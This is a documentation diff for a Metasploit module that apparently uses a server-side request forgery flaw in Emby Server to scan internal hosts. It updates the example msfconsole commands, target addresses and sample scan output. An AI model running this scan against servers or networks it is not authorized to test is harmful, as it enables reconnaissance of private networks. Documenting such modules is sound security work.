@@ -36,17 +36,20 @@ If set to `false`, will not store the captured information in notes. Use `notes 
 
 ## Scenarios
 
-### Emby Server (v4.4.3 on Ubuntu) - Scan Internal 192.168.1.0 Network
+### Emby Server (v4.4.3 on Ubuntu) - Scan Internal 192.168.2.0 Network
 
 ```
 msf6 > use auxiliary/scanner/http/emby_ssrf_scanner
 msf6 auxiliary(scanner/http/emby_ssrf_scanner) > set emby_server 10.10.200.32
 emby_server => 10.10.200.32
-msf6 auxiliary(scanner/http/emby_ssrf_scanner) > set rhosts 10.10.10.43
-rhosts => 10.10.10.43
+msf6 auxiliary(scanner/http/emby_ssrf_scanner) > set rhosts 192.168.2.3
+rhosts => 192.168.2.3
 msf6 auxiliary(scanner/http/emby_ssrf_scanner) > run
 
-[+] 10.10.10.43:80 [C:200] [R:] [S:UPnP/1.0 DLNADOC/1.50] HP Integrated Lights-Out 2
+[+] 192.168.2.3:8096 Title: Emby
+[+] 192.168.2.3:8096     HTTP Code: 200
+[+] 192.168.2.3:8096     Location Header:
+[+] 192.168.2.3:8096     Server Header: UPnP/1.0 DLNADOC/1.50
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
